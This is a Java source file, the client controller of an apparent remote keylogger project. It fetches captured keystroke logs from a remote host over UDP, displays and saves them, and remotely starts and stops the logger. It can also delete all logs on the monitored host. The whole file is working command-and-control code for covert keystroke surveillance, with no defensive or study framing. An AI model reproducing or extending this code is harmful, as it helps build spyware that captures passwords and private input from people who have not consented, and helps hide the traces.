package com.hao.keylogger.controllers.Client;

import java.awt.Desktop;
import java.io.File;
import java.io.IOException;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.StringTokenizer;

import javax.swing.JFrame;

import com.hao.keylogger.models.Log;
import com.hao.keylogger.utils.FileManager;
import com.hao.keylogger.utils.LogConverter;
import com.hao.keylogger.utils.Resources;
import com.hao.keylogger.views.ClientView;

public class ClientLogController {
	private ClientView view;
	ArrayList<Log> logs = new ArrayList<Log>();
	Log currentLog = new Log();
	private boolean isLoggerRunning = true;
	private boolean isLogConverted = true;
	public ClientLogController(ClientView view) {
		super();
		this.view = view;
		this.view.setController(this);
		this.view.setHost(UDPClientHelper.getLocalHostIP());
		this.view.setPort(Resources.DEFAULT_PORT);
	}

	public JFrame getLogView() {
		return view;
	}

	public void setLogView(ClientView logView) {
		this.view = logView;
	}

	public void displayLog(int index) {
		currentLog = logs.get(index);
		String logContent = "";
		LogConverter logConverter = new LogConverter();
		if (isLogConverted) {
			logContent = logConverter.convert(currentLog.getContent());
		}
		else {
			logContent = currentLog.getContent();
		}
		view.setLogContent(logContent);
		view.scrollLogViewToTop();
		SimpleDateFormat sdf = new SimpleDateFormat("EEE dd/MM/yyyy");
		view.updateLogInfo("Host: " + currentLog.getHost() + " | Port: " + currentLog.getPort() + " | Date: " + sdf.format(currentLog.getDateOfLog()));	
		
	}

	public void fetchLog(Date date) {
		logs.clear();
		try {
			// the log will be displayed when it is fetched
			new UDPClientHelper(this, view.getHostAddress(), view.getPort()).fetchLog(date);
		} catch (SocketException | UnknownHostException e) {
			view.showErrorMessage("Fetch log error", "Invalid host address or port!");
			e.printStackTrace();
		} catch (NullPointerException ex) {
			view.showErrorMessage("Fetch log error", "Can not fetch log!");
		}

	}

	public void fetchAllLogs() {
		// the log will be displayed when it is fetched
		try {
			new UDPClientHelper(this, view.getHostAddress(), view.getPort()).fetchAllLogs();
		} catch (SocketException e) {
			e.printStackTrace();
		} catch (UnknownHostException e) {
			e.printStackTrace();
		}
	}

	/**
	 * Display the fetched log to view
	 * 
	 * @param log
	 */
	public void receiveLogFromServer(ArrayList<Log> logs) {
		if (logs.size() == 0) {
			view.showInfoMessage("Key logger", "No logs fetched");
			view.setLogList(new ArrayList<String>());
			view.updateLogInfo("");
			return;
		}
		this.logs = logs;
		updateViewWhenLogListChanged();
	}

	private void updateViewWhenLogListChanged() {
		ArrayList<String> logListNames = new ArrayList<String>();
		for (Log log : logs) {
			logListNames.add(log.getName());
		}
		setViewLogList(logListNames);
		displayLog(0);
	}

	private void setViewLogList(ArrayList<String> logListNames) {
		view.setLogList(logListNames);
	}

	public void saveLog(int logListSelectedIndex) {
		if (logs.size() == 0) {
			view.showInfoMessage("Save log", "No logs to save");
			return;
		}
		Log log = logs.get(logListSelectedIndex);
		try {
			writeToFile(log);
			view.showInfoMessage("Save log",
					"Log was saved at\n" + new File(Resources.LOGS_CLIENT_DIRECTORY).getAbsolutePath());
		} catch (IOException e) {
			e.printStackTrace();
			view.showErrorMessage("Save log", "Error: \n" + e.getMessage());
		}
	}

	private void writeToFile(Log log) throws IOException {
		String filePath = Resources.LOGS_CLIENT_DIRECTORY + File.separator + log.getName()
				+ Resources.LOG_OBJECT_FILE_EXTENSION;
		// FileManager fm = new FileManager(filePath);
		// fm.writeToFile(log.getContent());

		FileManager fm = new FileManager();
		fm.writeLogToFile(log, filePath);
	}

	public void saveAllLogs() {
		if (logs.size() == 0) {
			view.showInfoMessage("Save all logs", "No logs to save");
			return;
		}
		try {
			for (Log log : logs) {
				writeToFile(log);
			}
			view.showInfoMessage("Save all logs",
					"Logs were saved at \n" + new File(Resources.LOGS_CLIENT_DIRECTORY).getAbsolutePath());
		} catch (IOException e) {
			e.printStackTrace();
			view.showErrorMessage("Save all logs", "Error:\n" + e.getMessage());
		}
	}

	public void deleteAllHostLogs() {
		try {
			new UDPClientHelper(this, view.getHostAddress(), view.getPort()).deleteAllHostLogs();
		} catch (SocketException e) {
			e.printStackTrace();
		} catch (UnknownHostException e) {
			e.printStackTrace();
		}
	}

	public void toggleLoggerRemote() {
		try {
			if (isLoggerRunning) {
				new UDPClientHelper(this, view.getHostAddress(), view.getPort()).stopLogger();
			} else {
				new UDPClientHelper(this, view.getHostAddress(), view.getPort()).startLogger();
			}
		} catch (SocketException e) {
			e.printStackTrace();
		} catch (UnknownHostException e) {
			e.printStackTrace();
		}

	}

	public void loadAllSavedLogs() {
		logs.clear();
		File logFolder = new File(Resources.LOGS_CLIENT_DIRECTORY);
		File[] logFiles = logFolder.listFiles();
		if (logFiles.length > 0) {
			for (File f : logFiles) {
				Log log = new Log();
				FileManager fm = new FileManager();
				log = fm.loadLogFromFile(f.getPath());
				logs.add(log);
			}
			updateViewWhenLogListChanged();
		}
	}

	public void receiveMessageFromServer(String msg) {
		StringTokenizer strTokenizer = new StringTokenizer(msg, "?");
		String request = strTokenizer.nextToken();
		boolean isSuccessful = new Boolean(strTokenizer.nextToken());
		String serverMsg = strTokenizer.nextToken();
		switch (request) {
		case Resources.DELETE_ALL_HOST_LOGS:
			if (isSuccessful) {
				view.showInfoMessage("Key logger - Delete host logs result", serverMsg);
			} else {
				view.showErrorMessage("Key logger - Delete host logs result", serverMsg);
			}
			break;
		case Resources.STOP_LOGGER:
			if (isSuccessful) {
				view.updateMenuItemWhenLoggerStop();
				view.showInfoMessage("Key logger - Stop logger", serverMsg);
				view.updateMenuItemWhenLoggerStop();
				isLoggerRunning = false;
			} else {
				view.showErrorMessage("Key logger - Stop logger", serverMsg);
			}
			break;
		case Resources.START_LOGGER:
			if (isSuccessful) {
				view.updateMenuItemWhenLoggerStart();
				view.showInfoMessage("Key logger - Start logger", serverMsg);
				isLoggerRunning = true;
			} else {
				view.showErrorMessage("Key logger - Start logger", serverMsg);
			}
			break;
		}
	}

	public void switchView() {
		if (!isLogConverted) {
			LogConverter logConverter = new LogConverter();
			String convertedLog = logConverter.convert(currentLog.getContent());
			view.setLogContent(convertedLog);
			isLogConverted = true;
		}
		else {
			view.setLogContent(currentLog.getContent());
			isLogConverted = false;
		}
		
	}

	public void receiveMessage(String msg) {
		view.showErrorMessage("Fetch log", msg);		
	}

	public boolean deleteSavedLogs() {
		File logFolder = new File(Resources.LOGS_CLIENT_DIRECTORY);
		if (!logFolder.exists()) {
			return false;
		}
		for (File f : logFolder.listFiles()) {
			try {
				f.delete();
			} catch (Exception e) {
				return false;
			}
		}
		return true;
	}

	public boolean manageLogs() {
		try {
			File logsDir = new File(Resources.LOGS_CLIENT_DIRECTORY);
			if (!logsDir.exists()) {
				throw new IOException("Log directory not found!");
			}
			Desktop.getDesktop().open(logsDir);
			return true;
		} catch (IOException e) {
		return false;
		}
	}

	public void showServerForm() {
		try {
			new UDPClientHelper(this, view.getHostAddress(), view.getPort()).showServerForm();
		} catch (SocketException | UnknownHostException e) {
			e.printStackTrace();
		}
	}

}
